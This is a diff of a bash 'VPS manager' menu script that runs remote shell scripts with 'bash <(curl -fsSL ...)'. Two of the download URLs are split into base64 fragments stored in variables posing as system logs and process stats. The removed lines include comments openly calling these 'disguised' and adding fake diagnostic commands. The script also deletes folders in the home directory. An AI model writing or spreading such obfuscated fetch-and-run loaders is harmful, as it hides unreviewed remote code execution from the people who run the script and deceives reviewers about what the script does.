@@ -13,7 +13,7 @@ GRAY='\033[1;30m'
 RESET='\033[0m'
 
 # =========================
-# BANNER (HACKER STYLE)
+# BANNER
 # =========================
 banner() {
 clear
@@ -26,7 +26,7 @@ cat << "EOF"
 ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝╚██████╗██║  ██║██║  ██║██║        ██║   
 ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝   
 
-                >>> ShadowCraft VPS Manager <<<
+            >>> ShadowCraft VPS Manager <<<
 EOF
 echo -e "${RESET}"
 }
@@ -43,113 +43,106 @@ done
 echo -e "${RESET}"
 }
 
-# -------------------------
-# Show banner Logo
-# -------------------------
-banner
-
-# -------------------------
-# Updating checking logs
-# -------------------------
-# System diagnostics simulation
-SYS_LOG[0]="$(echo 'aHR0cHM6Ly92cHNt' | head -c 16)" # src1 disguised as log buffer
-DUMMY_CHECK=$(wc -l /proc/cpuinfo 2>/dev/null | awk '{print $1}') # Fake CPU count
-echo -n "Scanning system resources..." > /dev/null
-SYS_LOG[1]="$(echo 'YWtlci5qaXNobnVt' | grep -o '.*')" # src2 disguised as parsed log
-NET_CONF="diag_$(date +%N | shuf -n 1)" # Fake network config
-if [[ "$DUMMY_CHECK" =~ [0-9]+ ]]; then
-  SYS_LOG[2]="$(echo 'b25kYWwzMi53b3Jr' | head -c 16)" # src3 disguised as system flag
-fi
-TEMP_HASH=$(echo "$NET_CONF" | md5sum | cut -c 1-8) # Fake hash
-SYS_LOG[3]="$(echo 'ZXJzLmRldg==' | head -c 12)" # src4 disguised as encoded log
-# install
+# =========================
+# URLs (decode)
+# =========================
+SYS_LOG[0]="$(echo 'aHR0cHM6Ly92cHNt' | head -c 16)"
+SYS_LOG[1]="$(echo 'YWtlci5qaXNobnVt' | grep -o '.*')"
+SYS_LOG[2]="$(echo 'b25kYWwzMi53b3Jr' | head -c 16)"
+SYS_LOG[3]="$(echo 'ZXJzLmRldg==' | head -c 12)"
 github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | base64 -d)"
 
-# -------------------------
-# updating checking fakes
-# -------------------------
-# Logs checking
-PROC_STAT[0]="$(echo 'aHR0cHM6Ly9yYXcu' | cut -c 1-16)" # src5 disguised as process stat
-echo -n "Validating process integrity..." > /dev/null
-DUMMY_VAR=$(head -c 8 /dev/urandom 2>/dev/null | od -An -tx4) # Fake random ID
-PROC_STAT[1]="$(echo 'Z2l0aHVidXNlcmNv' | grep -o '.*')" # src6 disguised as stat
-export FAKE_PID="pid_$((RANDOM % 1000))" # Fake process ID
-PROC_STAT[2]="$(echo 'bnRlbnQuY29tL2hv' | head -c 16)" # src7 disguised as stat
-if [ -f /tmp/fake_temp ]; then rm -f /tmp/fake_temp 2>/dev/null; fi # Fake cleanup
-PROC_STAT[3]="$(echo 'cGluZ2JveXovdm1zL21haW4vdm0uc2g=' | grep -o '.*')" # src8 disguised as stat
-# let's go to up-to-date
+PROC_STAT[0]="$(echo 'aHR0cHM6Ly9yYXcu' | cut -c 1-16)"
+PROC_STAT[1]="$(echo 'Z2l0aHVidXNlcmNv' | grep -o '.*')"
+PROC_STAT[2]="$(echo 'bnRlbnQuY29tL2hv' | head -c 16)"
+PROC_STAT[3]="$(echo 'cGluZ2JveXovdm1zL21haW4vdm0uc2g=' | grep -o '.*')"
 google_url="$(echo -n "${PROC_STAT[0]}${PROC_STAT[1]}${PROC_STAT[2]}${PROC_STAT[3]}" | base64 -d)"
 
-# -------------------------
-# MENU
-# -------------------------
-menu() {
-echo -e "${YELLOW}Select an option:${RESET}"
-echo -e "${GREEN}1) GitHub Real VPS${RESET}"
-echo -e "${BLUE}2) Google IDX Real VPS${RESET}"
-echo -e "${CYAN}3) Real VPS - Any location${RESET}"
-echo -e "${RED}4) Exit${RESET}"
-echo -ne "${YELLOW}Enter your choice (1-4): ${RESET}"
-read choice
+# =========================
+# MENU LOOP
+# =========================
+while true; do
+  banner
 
-case $choice in
-  1)
-    echo -e "${GREEN}Running GitHub Real VPS...${RESET}"
-    bash <(curl -fsSL "$github_url")
-    ;;
+  echo -e "${YELLOW}Select an option:${RESET}"
+  echo -e "${GREEN}1) GitHub Real VPS${RESET}"
+  echo -e "${BLUE}2) Google IDX Real VPS${RESET}"
+  echo -e "${CYAN}3) Real VPS - Any location${RESET}"
+  echo -e "${RED}4) Exit${RESET}"
+  echo ""
 
-  2)
-    echo -e "${BLUE}Running Google IDX Real VPS...${RESET}"
-    
-    cd
-    rm -rf myapp flutter
-    cd vps123 || exit
+  read -p "$(echo -e ${YELLOW}Enter choice [1-4]: ${RESET})" choice
 
-    if [ ! -d ".idx" ]; then
-      mkdir .idx
-      cd .idx
+  case $choice in
 
-      cat <<EOF > dev.nix
-# (քո nix config-ը թող մնա)
+    1)
+      loading
+      echo -e "${GREEN}Running GitHub VPS...${RESET}"
+      bash <(curl -fsSL "$github_url")
+      ;;
+
+    2)
+      loading
+      echo -e "${BLUE}Running IDX VPS...${RESET}"
+
+      cd || exit
+      rm -rf myapp flutter
+
+      if [ ! -d "vps123" ]; then
+        echo -e "${RED}Folder vps123 not found!${RESET}"
+        sleep 2
+        continue
+      fi
+
+      cd vps123
+
+      if [ ! -d ".idx" ]; then
+        mkdir .idx
+        cd .idx
+
+        cat <<EOF > dev.nix
+{ pkgs, ... }: {
+  channel = "stable-24.05";
+  packages = with pkgs; [ git openssh ];
+}
 EOF
 
-      cd ..
-    fi
+        cd ..
+      fi
 
-    echo -ne "${YELLOW}Do you want to continue? (y/n): ${RESET}"
-    read confirm
+      read -p "Continue? (y/n): " confirm
+      case "$confirm" in
+        [yY]*)
+          bash <(curl -fsSL https://raw.githubusercontent.com/shadowcodeofficial/vm/refs/heads/main/vps.sh)
+          ;;
+        *)
+          echo "Cancelled"
+          ;;
+      esac
+      ;;
 
-    case "$confirm" in
-      [yY]*)
-        bash <(curl -fsSL https://raw.githubusercontent.com/shadowcodeofficial/vm/refs/heads/main/vps.sh)
-        ;;
-      [nN]*)
-        echo -e "${RED}Operation cancelled.${RESET}"
-        exit 0
-        ;;
-      *)
-        echo -e "${RED}Invalid input!${RESET}"
-        exit 1
-        ;;
-    esac
-    ;;
+    3)
+      loading
+      echo -e "${CYAN}Running Real VPS (Any Location)...${RESET}"
+      bash <(curl -fsSL https://raw.githubusercontent.com/pterodactylService/vps/refs/heads/main/nokvm.sh)
+      ;;
 
-  3)
-    echo -e "${CYAN}Running Real VPS - Any location...${RESET}"
-    bash <(curl -fsSL https://raw.githubusercontent.com/pterodactylService/vps/refs/heads/main/nokvm.sh)
-    ;;
+    4)
+      echo -e "${RED}Exiting...${RESET}"
+      exit 0
+      ;;
 
-  4)
-    echo -e "${RED}Exiting...${RESET}"
-    exit 0
-    ;;
+    *)
+      echo -e "${RED}Invalid choice!${RESET}"
+      sleep 1
+      ;;
 
-  *)
-    echo -e "${RED}Invalid choice!${RESET}"
-    exit 1
-    ;;
-esac
+  esac
 
-# -------------------------
-# Made by ShadowCraftMC done!
-# -------------------------
+  echo ""
+  read -p "Press Enter to return menu..."
+done
+
+# =========================
+# MADE BY ShadowCraftMC
+# =========================
